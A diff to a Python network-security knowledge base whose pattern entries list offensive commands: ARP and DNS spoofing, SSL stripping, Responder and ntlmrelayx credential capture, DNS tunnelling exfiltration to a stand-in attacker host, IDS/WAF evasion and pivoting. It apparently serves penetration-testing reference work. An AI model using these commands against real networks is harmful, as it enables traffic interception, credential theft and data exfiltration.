@@ -1,11 +1,11 @@
 """Network security knowledge base.
 
 Deep knowledge about network vulnerabilities:
-1. Network reconnaissance and mapping
-2. ARP/DNS poisoning and MITM
-3. VLAN hopping and segmentation bypass
-4. Protocol-level attacks
-5. Network device exploitation
+1. Network protocol attacks
+2. Man-in-the-middle techniques
+3. DNS exploitation
+4. Firewall and IDS evasion
+5. Network segmentation testing
 """
 
 from __future__ import annotations
@@ -39,180 +39,177 @@ class NetworkPattern:
 
 NETWORK_PATTERNS: list[dict[str, Any]] = [
     {
-        "id": "net-001", "name": "Network Reconnaissance",
-        "category": "recon", "severity": "info",
-        "desc": "Network mapping and service discovery.",
+        "id": "net-001", "name": "ARP and Layer 2 Attacks",
+        "category": "layer2", "severity": "high",
+        "desc": "Layer 2 network attack techniques.",
         "detection": (
-            "NETWORK RECONNAISSANCE:\n"
-            "HOST DISCOVERY:\n"
-            "  nmap -sn 192.168.1.0/24  # Ping sweep\n"
-            "  nmap -sn -PE 10.0.0.0/8  # ICMP echo\n"
-            "  nmap -sn -PA 80,443 10.0.0.0/24  # TCP ACK\n"
-            "  masscan 10.0.0.0/8 -p80,443,22,445 --rate=10000\n"
-            "  arp-scan --localnet  # ARP discovery\n"
-            "PORT SCANNING:\n"
-            "  nmap -sS -p- -T4 <target>  # SYN scan all ports\n"
-            "  nmap -sU --top-ports 100 <target>  # UDP scan\n"
-            "  nmap -sV -sC -O <target>  # Version, scripts, OS\n"
-            "  nmap -A <target>  # Aggressive (all features)\n"
-            "SERVICE ENUMERATION:\n"
-            "  # SMB\n"
-            "  smbclient -L //<target> -N  # List shares\n"
-            "  crackmapexec smb <target> -u '' -p '' --shares\n"
-            "  enum4linux-ng <target>  # Full SMB enumeration\n"
-            "  # SNMP\n"
-            "  snmpwalk -v2c -c public <target>\n"
-            "  onesixtyone -c community.txt <target>\n"
-            "  # LDAP\n"
-            "  ldapsearch -x -H ldap://<target> -b '' namingContexts\n"
-            "  # RPC\n"
-            "  rpcclient -U '' <target>  # Null session\n"
-            "  rpcclient> enumdomusers"
-        ),
-        "tools": ["nmap", "masscan", "crackmapexec"],
-    },
-    {
-        "id": "net-002", "name": "ARP and DNS Poisoning",
-        "category": "mitm", "severity": "high",
-        "desc": "Man-in-the-middle via ARP/DNS poisoning.",
-        "detection": (
-            "ARP AND DNS POISONING:\n"
+            "ARP AND LAYER 2 ATTACKS:\n"
             "ARP SPOOFING:\n"
-            "  # arpspoof (dsniff suite)\n"
-            "  arpspoof -i eth0 -t <victim> <gateway>\n"
-            "  arpspoof -i eth0 -t <gateway> <victim>\n"
+            "  # Intercept traffic between two hosts\n"
+            "  arpspoof -i eth0 -t <target> <gateway>\n"
+            "  arpspoof -i eth0 -t <gateway> <target>\n"
             "  # Enable IP forwarding\n"
             "  echo 1 > /proc/sys/net/ipv4/ip_forward\n"
-            "  # Ettercap\n"
-            "  ettercap -T -M arp:remote /<victim>// /<gateway>//\n"
-            "  # Bettercap (modern)\n"
+            "  # Bettercap (modern alternative)\n"
             "  bettercap -iface eth0\n"
-            "  net.probe on\n"
-            "  arp.spoof on\n"
-            "  set arp.spoof.targets <victim>\n"
-            "DNS POISONING:\n"
-            "  # Bettercap\n"
-            "  set dns.spoof.all true\n"
-            "  set dns.spoof.domains target.com\n"
-            "  dns.spoof on\n"
-            "  # Responder (LLMNR/NBT-NS/mDNS)\n"
-            "  responder -I eth0 -wrf\n"
-            "  # Captures NTLMv2 hashes automatically\n"
-            "DETECTION:\n"
-            "  - ARP table changes (arp -a monitoring)\n"
-            "  - Duplicate MAC addresses\n"
-            "  - arpwatch for ARP table monitoring\n"
-            "  - Static ARP entries for critical systems"
-        ),
-        "tools": ["bettercap", "responder", "ettercap"],
-    },
-    {
-        "id": "net-003", "name": "VLAN Hopping and Segmentation",
-        "category": "vlan", "severity": "high",
-        "desc": "Bypassing network segmentation via VLAN attacks.",
-        "detection": (
+            "  > net.probe on; arp.spoof on; net.sniff on\n"
             "VLAN HOPPING:\n"
-            "SWITCH SPOOFING:\n"
-            "  - Attacker's NIC acts as trunk port\n"
-            "  - Uses DTP (Dynamic Trunking Protocol)\n"
-            "  - Yersinia: yersinia -G  # GUI for protocol attacks\n"
-            "  yersinia dtp -attack 1 -interface eth0\n"
-            "DOUBLE TAGGING:\n"
-            "  - Encapsulate frame with two 802.1Q tags\n"
-            "  - Outer tag matches native VLAN\n"
-            "  - Switch strips outer tag, forwards to inner VLAN\n"
-            "  - Only works one-way (no return traffic)\n"
-            "  # Craft with Scapy\n"
-            "  # Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=target)/IP()/...\n"
-            "VLAN ENUMERATION:\n"
-            "  # CDP/LLDP\n"
-            "  cdp-listener  # Listen for CDP packets\n"
-            "  lldpctl  # LLDP neighbor info\n"
-            "  # Identify VLANs\n"
-            "  nmap --script broadcast-dhcp-discover\n"
-            "  # Tcpdump for tagged frames\n"
-            "  tcpdump -i eth0 -e 'vlan'\n"
-            "SEGMENTATION TESTING:\n"
-            "  - Verify firewall rules between VLANs\n"
-            "  - Test inter-VLAN routing restrictions\n"
-            "  - Check for routing leaks\n"
-            "  - Verify ACLs on switch ports"
+            "  - Switch spoofing (DTP negotiation)\n"
+            "  - Double tagging (802.1Q-in-802.1Q)\n"
+            "  - Requires native VLAN misconfiguration\n"
+            "MAC FLOODING:\n"
+            "  macof -i eth0  # Flood switch CAM table\n"
+            "  # Switch falls back to hub mode (broadcasts all)\n"
+            "STP ATTACKS:\n"
+            "  # Become root bridge\n"
+            "  # yersinia -G  # GUI for L2 attacks\n"
+            "  yersinia stp -attack 3 -i eth0  # Root bridge attack\n"
+            "DHCP ATTACKS:\n"
+            "  # DHCP starvation\n"
+            "  # DHCP rogue server\n"
+            "  # Redirect DNS/gateway via DHCP"
         ),
-        "tools": ["yersinia", "nmap", "tcpdump"],
+        "tools": ["bettercap", "yersinia", "macof"],
     },
     {
-        "id": "net-004", "name": "IPv6 Security",
-        "category": "ipv6", "severity": "high",
-        "desc": "IPv6-specific attacks and reconnaissance.",
+        "id": "net-002", "name": "MITM Techniques",
+        "category": "mitm", "severity": "critical",
+        "desc": "Man-in-the-middle attack techniques.",
         "detection": (
-            "IPv6 SECURITY:\n"
-            "ENUMERATION:\n"
-            "  # IPv6 host discovery\n"
-            "  nmap -6 --script ipv6-multicast-mld-list\n"
-            "  alive6 eth0  # ICMPv6 ping\n"
-            "  # Enumerate link-local addresses\n"
-            "  ping6 -c 2 ff02::1%eth0  # All nodes multicast\n"
-            "ATTACKS:\n"
-            "  SLAAC SPOOFING:\n"
-            "    - Send rogue Router Advertisements\n"
-            "    - Become default gateway for IPv6\n"
-            "    - MITM all IPv6 traffic\n"
-            "    # mitm6\n"
-            "    mitm6 -d company.local\n"
-            "    # Combined with ntlmrelayx\n"
-            "    ntlmrelayx.py -6 -t ldaps://dc01 -wh fakewpad\n"
-            "  DHCPv6 SPOOFING:\n"
-            "    - Respond to DHCPv6 requests\n"
-            "    - Set attacker as DNS server\n"
-            "    - Redirect DNS queries\n"
-            "  NDP SPOOFING:\n"
-            "    - Neighbor Discovery Protocol\n"
-            "    - Similar to ARP spoofing but IPv6\n"
-            "    - parasite6 eth0  # NDP spoofing tool\n"
-            "DUAL-STACK ISSUES:\n"
-            "  - IPv6 enabled but not monitored\n"
-            "  - No firewall rules for IPv6\n"
-            "  - IPv6 tunneling bypass (6to4, Teredo)"
+            "MITM TECHNIQUES:\n"
+            "ARP-BASED MITM:\n"
+            "  bettercap -iface eth0\n"
+            "  > set arp.spoof.targets <target>\n"
+            "  > arp.spoof on\n"
+            "  > net.sniff on\n"
+            "SSL STRIPPING:\n"
+            "  # Downgrade HTTPS to HTTP\n"
+            "  bettercap> set http.proxy.sslstrip true\n"
+            "  bettercap> http.proxy on\n"
+            "  # Modern defense: HSTS\n"
+            "  # Bypass: HSTS bypass via NTP manipulation\n"
+            "DNS SPOOFING:\n"
+            "  bettercap> set dns.spoof.all true\n"
+            "  bettercap> set dns.spoof.domains target.com\n"
+            "  bettercap> dns.spoof on\n"
+            "LLMNR/NBT-NS POISONING:\n"
+            "  # Windows name resolution poisoning\n"
+            "  responder -I eth0 -wrf\n"
+            "  # Captures NTLMv2 hashes\n"
+            "  # Crack: hashcat -m 5600 hashes.txt wordlist.txt\n"
+            "  # Relay: ntlmrelayx.py\n"
+            "IPv6 MITM:\n"
+            "  # RA spoofing (rogue IPv6 router)\n"
+            "  mitm6 -d target.com\n"
+            "  # Combined with ntlmrelayx\n"
+            "  ntlmrelayx.py -6 -t ldaps://dc.target.com"
         ),
-        "tools": ["mitm6", "nmap", "alive6"],
+        "tools": ["bettercap", "responder", "mitm6"],
     },
     {
-        "id": "net-005", "name": "Network Device Exploitation",
-        "category": "device", "severity": "critical",
-        "desc": "Exploiting routers, switches, and firewalls.",
+        "id": "net-003", "name": "DNS Exploitation",
+        "category": "dns", "severity": "high",
+        "desc": "DNS-based attack techniques.",
         "detection": (
-            "NETWORK DEVICE EXPLOITATION:\n"
-            "ROUTER/SWITCH:\n"
-            "  - Default credentials (admin/admin, cisco/cisco)\n"
-            "  - SNMP community strings (public, private)\n"
-            "  - Telnet/SSH with weak credentials\n"
-            "  - Web management interface vulnerabilities\n"
-            "  # Cisco\n"
-            "  cisco-torch -A <target>  # Cisco scanner\n"
-            "  nmap --script cisco-brute <target>\n"
-            "  # Extract config via SNMP\n"
-            "  snmpset -v1 -c <community> <target>\\\n"
-            "    1.3.6.1.4.1.9.2.1.55.<tftp-server> s running-config\n"
-            "FIREWALL:\n"
-            "  - Rule bypass (fragmentation, tunneling)\n"
-            "  - Management interface exposed\n"
-            "  - Default admin credentials\n"
-            "  - Firmware vulnerabilities\n"
-            "  # Firewall fingerprinting\n"
-            "  nmap -sA <target>  # ACK scan for filtering\n"
-            "  nmap --script firewall-bypass <target>\n"
-            "WIFI AP:\n"
-            "  - Default credentials on management\n"
-            "  - WPS enabled (pixie dust, brute force)\n"
-            "  - Outdated firmware\n"
-            "  - Client isolation bypass\n"
-            "  - Hidden SSID enumeration\n"
-            "VPN:\n"
-            "  - IKE aggressive mode (hash capture)\n"
-            "  ike-scan -M -A <target>  # Detect VPN\n"
-            "  - SSL VPN interface vulnerabilities"
+            "DNS EXPLOITATION:\n"
+            "ZONE TRANSFER:\n"
+            "  dig axfr target.com @ns1.target.com\n"
+            "  # Full zone = all DNS records\n"
+            "DNS CACHE POISONING:\n"
+            "  - Kaminsky attack\n"
+            "  - TXID prediction\n"
+            "  - Requires no DNSSEC\n"
+            "DNS TUNNELING:\n"
+            "  # Exfiltrate data through DNS queries\n"
+            "  # Tools: iodine, dnscat2, dns2tcp\n"
+            "  iodine -f -P password tunnel.attacker.com\n"
+            "  dnscat2-client tunnel.attacker.com\n"
+            "DNS REBINDING:\n"
+            "  - First resolve to attacker IP\n"
+            "  - Second resolve to target internal IP\n"
+            "  - Bypass same-origin policy\n"
+            "  - Access internal services via browser\n"
+            "SUBDOMAIN TAKEOVER:\n"
+            "  # CNAME pointing to unclaimed service\n"
+            "  dig CNAME target.com\n"
+            "  # Check: app.target.com CNAME → deleted.herokuapp.com\n"
+            "  # Claim the service = own the subdomain\n"
+            "  # Tools: subjack, nuclei\n"
+            "  subjack -w subdomains.txt -a -ssl\n"
+            "  nuclei -t takeovers/ -l subdomains.txt"
         ),
-        "tools": ["nmap", "snmpwalk", "ike-scan"],
+        "tools": ["dig", "dnscat2", "subjack"],
+    },
+    {
+        "id": "net-004", "name": "Firewall/IDS Evasion",
+        "category": "evasion", "severity": "high",
+        "desc": "Firewall and IDS/IPS evasion techniques.",
+        "detection": (
+            "FIREWALL/IDS EVASION:\n"
+            "NMAP EVASION:\n"
+            "  # Fragment packets\n"
+            "  nmap -f -f <target>  # Double fragmentation\n"
+            "  # Decoy scanning\n"
+            "  nmap -D RND:10 <target>\n"
+            "  # Idle/zombie scan\n"
+            "  nmap -sI <zombie> <target>\n"
+            "  # Source port manipulation\n"
+            "  nmap --source-port 53 <target>\n"
+            "  # Timing: slow scan\n"
+            "  nmap -T0 <target>  # Paranoid (5 min between probes)\n"
+            "PROTOCOL EVASION:\n"
+            "  - IP fragmentation and reassembly\n"
+            "  - TCP segmentation overlap\n"
+            "  - TTL manipulation\n"
+            "  - Protocol encapsulation (ICMP/DNS tunneling)\n"
+            "  - IPv6 tunnel through IPv4\n"
+            "PAYLOAD EVASION:\n"
+            "  - Encoding: Base64, hex, URL encoding\n"
+            "  - Case variation: SeLeCt → SELECT\n"
+            "  - Comment insertion: SE/**/LECT\n"
+            "  - Unicode normalization\n"
+            "  - Chunked transfer encoding\n"
+            "WAF BYPASS:\n"
+            "  - HTTP method override (X-HTTP-Method-Override)\n"
+            "  - Content-Type manipulation\n"
+            "  - Parameter pollution\n"
+            "  - JSON/XML body instead of form data"
+        ),
+        "tools": ["nmap"],
+    },
+    {
+        "id": "net-005", "name": "Network Segmentation Testing",
+        "category": "segmentation", "severity": "high",
+        "desc": "Network segmentation and access control testing.",
+        "detection": (
+            "NETWORK SEGMENTATION TESTING:\n"
+            "VLAN TESTING:\n"
+            "  # Check VLAN isolation\n"
+            "  # Can hosts in VLAN A reach VLAN B?\n"
+            "  nmap -sn <other-vlan-range>\n"
+            "  # Check trunk ports\n"
+            "  # Look for native VLAN traffic\n"
+            "FIREWALL RULES:\n"
+            "  # Map allowed ports between segments\n"
+            "  nmap -Pn -p- <target-in-other-segment>\n"
+            "  # Check for overly permissive rules\n"
+            "  # Common issues: ANY-ANY rules, wide port ranges\n"
+            "LATERAL MOVEMENT PATHS:\n"
+            "  # From compromised host, what can be reached?\n"
+            "  # Network sweep\n"
+            "  nmap -sn 10.0.0.0/8 --min-rate 1000\n"
+            "  # Service discovery\n"
+            "  nmap -sV -p 22,80,443,445,3389 <range>\n"
+            "  # Common pivoting: SSH tunnel, proxychains\n"
+            "  ssh -D 1080 user@pivot  # SOCKS proxy\n"
+            "  proxychains nmap <internal-target>\n"
+            "MICRO-SEGMENTATION:\n"
+            "  - Host-based firewall rules\n"
+            "  - Zero-trust network access\n"
+            "  - Service mesh policies (Istio, Linkerd)\n"
+            "  - Cloud security groups / NSGs"
+        ),
+        "tools": ["nmap", "proxychains"],
     },
 ]
 
